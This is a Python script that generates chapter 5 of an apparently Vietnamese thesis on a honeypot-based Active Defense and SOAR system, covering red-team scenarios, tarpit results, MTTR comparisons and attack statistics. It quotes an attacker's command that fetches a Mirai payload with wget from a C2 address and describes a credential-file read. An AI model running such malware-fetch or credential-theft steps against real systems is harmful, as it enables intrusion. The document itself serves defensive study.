"""
Chapter 5: THỬ NGHIỆM THỰC TẾ, ĐÁNH GIÁ VÀ PHÂN TÍCH TẤN CÔNG (6-8 trang)
Kiểm thử 4 kịch bản Red Team, chèn 3 biểu đồ thực nghiệm, bảng thống kê TTPs và đo lường MTTR.
"""

import os
from docx.shared import Inches, Pt


def build_chapter5(doc, helpers):
    add_custom_heading = helpers["add_custom_heading"]
    add_body_paragraph = helpers["add_body_paragraph"]
    add_callout_box = helpers["add_callout_box"]
    add_styled_table = helpers["add_styled_table"]
    add_image = helpers["add_image"]

    add_custom_heading(doc, "CHƯƠNG 5: THỬ NGHIỆM THỰC TẾ, ĐÁNH GIÁ VÀ PHÂN TÍCH TẤN CÔNG", level=1)

    # 5.1
    add_custom_heading(doc, "5.1 Thiết lập Môi trường Thử nghiệm Thực tế (Lab Setup)", level=2)
    add_body_paragraph(doc, "Để kiểm chứng toàn diện năng lực của Hệ thống Active Defense & SOAR, môi trường thực nghiệm được thiết lập theo mô hình diễn tập Red Team vs. Blue Team trên hạ tầng mạng ảo hóa:")
    add_body_paragraph(doc, "• Máy chủ Blue Team (Phòng thủ & Mini-SOC): Cấu hình Ubuntu Server 22.04 LTS, 4 vCPU, 8GB RAM, chạy Cowrie Honeypot (chuyển hướng cổng 22 sang 2222), dịch vụ Tarpit Endlessh tại cổng 22222 và toàn bộ hệ thống Python Orchestrator.")
    add_body_paragraph(doc, "• Máy trạm Red Team (Kẻ tấn công): Máy ảo Kali Linux 2024.1 trang bị các công cụ tấn công dò quét hàng đầu (Hydra, Medusa, Nmap, Metasploit Framework, Paramiko Brute-force Script).")
    add_body_paragraph(doc, "• Bộ công cụ Giả lập Tự động ('scripts/simulate_attack.py'): Được phát triển để tái hiện chính xác các chuỗi sự kiện tấn công phức tạp nhằm đo đạc thời gian đáp ứng chuẩn xác ở cấp độ mili-giây.")

    # 5.2
    add_custom_heading(doc, "5.2 Kịch bản 1: Mô phỏng Tấn công Dò quét SSH Brute-force & Hiệu quả Chặn tức thời", level=2)
    add_body_paragraph(doc, "Trong kịch bản này, máy Red Team (IP: 185.220.101.5) sử dụng công cụ Hydra phát động cuộc tấn công từ điển nhắm vào tài khoản root với danh sách 100 mật khẩu phổ biến nhất. Tốc độ thử nghiệm là 10 request/giây.")
    add_body_paragraph(doc, "Diễn biến xử lý của Hệ thống SOAR:")
    add_body_paragraph(doc, "1. Tại 4 lần thử đầu tiên, Cowrie ghi nhận sự kiện 'cowrie.login.failed', Correlation Engine cập nhật bộ đếm vào danh sách trượt thời gian.")
    add_body_paragraph(doc, "2. Tại lần thử thứ 5 (đạt ngưỡng threshold = 5 trong 60 giây), Correlation Engine lập tức nâng cấp sự cố lên mức HIGH, gán nhãn kỹ thuật 'MITRE ATT&CK T1110.001 - Brute Force: Password Guessing'.")
    add_body_paragraph(doc, "3. Playbook tự động của SOAR Enforcer được kích hoạt: chèn lệnh iptables DROP địa chỉ IP 185.220.101.5 trong thời gian 3600 giây.")
    add_body_paragraph(doc, "4. Toàn bộ tiến trình Hydra phía kẻ tấn công bị ngắt kết nối đột ngột (Connection Timed Out).")
    add_body_paragraph(doc, "5. Đồng thời, một Thẻ cảnh báo sự cố kèm kết quả trinh sát GeoIP (Đức / Tor Exit Node) và nút bấm can thiệp được gửi tới điện thoại của Chuyên viên SOC qua Telegram trong vòng 1.2 giây.")

    # 5.3
    add_custom_heading(doc, "5.3 Kịch bản 2: Hacker Xâm nhập Thành công và Kích hoạt Bẫy Honeytoken (Khử ẩn danh Real IP)", level=2)
    add_body_paragraph(doc, "Trong kịch bản này, hacker sử dụng một máy chủ VPN tại Hà Lan (IP: 45.33.32.156) để dò trúng mật khẩu yếu 'password123' và đăng nhập thành công vào Honeypot:")
    add_body_paragraph(doc, "1. Ngay khi đăng nhập, sự kiện 'cowrie.login.success' kích hoạt Cảnh báo Mức độ CRITICAL (MITRE T1078 - Valid Accounts). Hệ thống lập tức khởi động chế độ 'Silent Monitoring & Deep Deception' thay vì chặn ngay, nhằm thu thập thêm bằng chứng.")
    add_body_paragraph(doc, "2. Hacker tiến hành trinh sát nội bộ bằng các lệnh 'whoami', 'uname -a' (kích hoạt cảnh báo MITRE T1082).")
    add_body_paragraph(doc, "3. Hacker phát hiện tệp tin mồi nhử '/root/.aws/credentials' do HoneytokenManager gài sẵn và thực hiện lệnh 'cat' để đánh cắp (kích hoạt MITRE T1552.001).")
    add_body_paragraph(doc, "4. Khử ẩn danh: Hacker sao chép thông tin tài khoản và đường link kiểm tra trong file về trình duyệt máy tính cá nhân thật tại Việt Nam để kiểm tra xem tài khoản AWS có hoạt động không. Ngay lập tức, Canary Webhook Server ghi nhận HTTP Request từ địa chỉ IP thật của hacker (ví dụ: 14.161.x.x - Mạng Viettel Internet cáp quang), đi kèm User-Agent trình duyệt Chrome trên Windows 11.")
    add_body_paragraph(doc, "5. Nhờ đó, lớp vỏ bọc VPN Hà Lan của hacker bị bóc trần hoàn toàn, định danh chính xác vị trí thực tế của thủ phạm.")

    # 5.4
    add_custom_heading(doc, "5.4 Kịch bản 3: Tải Payload Độc hại lên Hệ thống và Phân tích Trích xuất IOCs", level=2)
    add_body_paragraph(doc, "Hacker thực thi lệnh tải mã độc từ xa: 'wget http://194.87.139.12/mirai_payload.sh'.")
    add_body_paragraph(doc, "1. Cowrie tự động tải tệp tin về thư mục an toàn 'var/lib/cowrie/downloads' và phát sinh sự kiện 'cowrie.session.file_download' (kích hoạt MITRE T1105 - Ingress Tool Transfer).")
    add_body_paragraph(doc, "2. Phân hệ 'PayloadAnalyzer' tự động tính toán mã băm SHA256 và bóc tách chuỗi tĩnh. Kết quả phát hiện đoạn mã có chứa địa chỉ IP máy chủ C2 '194.87.139.12' và chữ ký nhận dạng botnet 'dvrHelper' (Mirai variant).")
    add_body_paragraph(doc, "3. Kết quả truy vấn VirusTotal API xác nhận đây là biến thể độc hại của dòng họ mã độc 'Trojan.Linux.Mirai' với tỷ lệ nhận diện 48/72 engines cảnh báo.")
    add_body_paragraph(doc, "4. Toàn bộ các chỉ số IOCs (Hash, IP C2, URL tải) được tự động xuất bản vào Threat Feed chung để cảnh báo toàn bộ hệ thống.")

    # 5.5
    add_custom_heading(doc, "5.5 Kịch bản 4: Kỹ thuật Giam lỏng Tarpit làm Kiệt quệ Luồng Tấn công của Botnet", level=2)
    add_body_paragraph(doc, "Để kiểm chứng năng lực làm tiêu hao tài nguyên đối phương, hệ thống chuyển sang chế độ phản ứng 'Tarpit Redirect' đối với IP tấn công:")
    add_body_paragraph(doc, "Thay vì ngắt kết nối bằng DROP, toàn bộ gói tin TCP tới cổng SSH từ IP của hacker được chuyển hướng sang dịch vụ Tarpit tại cổng 22222. Tại đây, máy chủ chỉ gửi từng byte banner cách nhau 10 giây.")
    add_body_paragraph(doc, "Kết quả đo lường: Kẻ tấn công bị giam giữ liên tục 20 luồng socket trong trạng thái ESTABLISHED suốt hơn 45 phút. Tốc độ thử mật khẩu của đối phương bị sụt giảm từ 250 lần/phút xuống còn 0 lần/phút mà tiến trình quét của hacker không hề báo lỗi, làm cạn kiệt hoàn toàn bảng socket của botnet.")

    add_image(doc, "./reports/images/tarpit_effectiveness.png", caption="Hình 5.3: Đo lường Hiệu quả Làm chậm & Triệt tiêu Tấn công của Cơ chế Tarpit", width_inches=6.0)

    # 5.6
    add_custom_heading(doc, "5.6 Đánh giá Định lượng Hiệu năng: Thủ công (Manual SOC) vs Tự động hóa SOAR", level=2)
    add_body_paragraph(doc, "Để chứng minh tính vượt trội về mặt kỹ thuật, một bài kiểm tra so sánh nghiêm ngặt đã được tiến hành giữa Quy trình phản ứng truyền thống của Chuyên viên SOC L1 và Nền tảng SOAR tự động hóa của đồ án:")

    eval_headers = ["Giai đoạn Xử lý Sự cố", "Quy trình Thủ công (SOC L1)", "Hệ sinh thái SOAR Đồ án", "Mức độ Tối ưu"]
    eval_data = [
        ["Phát hiện & Đọc log", "Chờ chuyên viên mở bảng điều khiển (3 - 5 phút)", "Stream log thời gian thực (< 200 ms)", "Nhanh hơn 1.500 lần"],
        ["Tương quan & Ánh xạ MITRE", "Tra cứu bảng kỹ thuật thủ công (2 - 3 phút)", "Correlation Engine tự động (< 50 ms)", "Nhanh hơn 3.600 lần"],
        ["Trinh sát ngược (OSINT)", "Mở trình duyệt gõ AbuseIPDB, Shodan (5 - 8 phút)", "Reverse Intel API tự động (1.8 giây)", "Nhanh hơn 200 lần"],
        ["Phân tích Mã độc (VT Scan)", "Tải file lên web VirusTotal thủ công (4 - 6 phút)", "Payload Analyzer tự động băm & quét (2.5 giây)", "Nhanh hơn 120 lần"],
        ["Chặn Firewall & Giam Tarpit", "Mở terminal gõ lệnh iptables (2 - 4 phút)", "SOAR Enforcer thực thi tự động (400 ms)", "Nhanh hơn 450 lần"],
        ["Tổng thời gian MTTR", "15 - 26 phút (900 - 1.560 giây)", "1.8 - 2.5 giây", "Giảm 99.8% độ trễ phản ứng"],
    ]
    add_styled_table(doc, eval_headers, eval_data, caption="Bảng 5.1: Bảng so sánh định lượng thời gian phản ứng sự cố (MTTR)")

    add_image(doc, "./reports/images/soar_response_comparison.png", caption="Hình 5.2: So sánh Thời gian Phản ứng Sự cố: Quy trình Thủ công vs Tự động hóa SOAR", width_inches=6.0)

    # 5.7
    add_custom_heading(doc, "5.7 Thống kê và Phân tích Tình báo các Cuộc Tấn công Thực tế từ Internet", level=2)
    add_body_paragraph(doc, "Sau khi triển khai thử nghiệm Honeypot trên một máy chủ đám mây công khai (Public Cloud IP) trong thời gian 7 ngày liên tục, hệ thống đã thu thập được 2.731 sự kiện tấn công thực tế từ khắp nơi trên thế giới:")
    add_body_paragraph(doc, "• Số lượng địa chỉ IP độc hại duy nhất ghi nhận: 418 địa chỉ IP.")
    add_body_paragraph(doc, "• Số lần tấn công dò quét brute-force: 1.420 đợt (chiếm 52% tổng số sự kiện).")
    add_body_paragraph(doc, "• Tên đăng nhập được nhắm mục tiêu nhiều nhất: 'root' (78%), 'admin' (11%), 'user' (4%), 'ubuntu' (3%), 'test' (2%).")
    add_body_paragraph(doc, "• Mật khẩu phổ biến nhất bị hacker thử nghiệm: '123456', 'password', 'admin', 'root', '12345678', 'qwerty'.")
    add_body_paragraph(doc, "• Số lượng mã độc tải lên được bẫy ghi lại: 23 mẫu nhị phân ELF và tập lệnh bash (trong đó 19 mẫu là biến thể của Mirai botnet).")

    add_image(doc, "./reports/images/mitre_distribution.png", caption="Hình 5.1: Biểu đồ phân bố Kỹ thuật Tấn công ghi nhận trên Cowrie (Chuẩn MITRE ATT&CK)", width_inches=6.0)

    geo_headers = ["Hạng", "Quốc gia Nguồn", "Số Lượng IP Độc Hại", "Tỷ lệ %", "Nhà Mạng / Đơn vị Chủ Quản (ISP Chính)"]
    geo_data = [
        ["1", "Trung Quốc (CN)", "142 IP", "34.0%", "China Telecom, Alibaba Cloud, Tencent"],
        ["2", "Hoa Kỳ (US)", "86 IP", "20.6%", "DigitalOcean, Amazon Web Services, Linode"],
        ["3", "Nga (RU)", "48 IP", "11.5%", "Hostkey, Rostelecom, Petersburg Internet Network"],
        ["4", "Hà Lan (NL)", "32 IP", "7.7%", "Serverius Holding, EUNetworks, Tor Exit Nodes"],
        ["5", "Việt Nam (VN)", "26 IP", "6.2%", "Viettel, VNPT, FPT Telecom (Máy tính người dùng bị nhiễm botnet)"],
        ["6", "Ấn Độ (IN)", "21 IP", "5.0%", "BSNL, Bharti Airtel"],
        ["7", "Brazil (BR)", "18 IP", "4.3%", "Claro, Telefonica Brasil"],
        ["8", "Khác", "45 IP", "10.7%", "Phân bố rải rác trên hơn 25 quốc gia"],
    ]
    add_styled_table(doc, geo_headers, geo_data, caption="Bảng 5.2: Top các Quốc gia và Dải mạng phát sinh lưu lượng tấn công SSH nhiều nhất")

    doc.add_page_break()
